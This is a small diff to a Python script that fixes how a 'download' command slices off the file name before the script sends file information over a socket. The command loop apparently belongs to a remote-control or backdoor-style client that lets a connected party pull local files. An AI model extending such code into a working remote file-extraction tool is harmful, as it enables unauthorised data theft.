@@ -422,7 +422,7 @@ def connection():
                         s.close()
                         break 
                     elif command.startswith('download'):
-                        file_name = command[5:]
+                        file_name = command[9:]
                         file_size = os.path.getsize(file_name)
                         s.send(file_name.encode('utf-8'))
                         s.recv(1024).decode('utf-8')
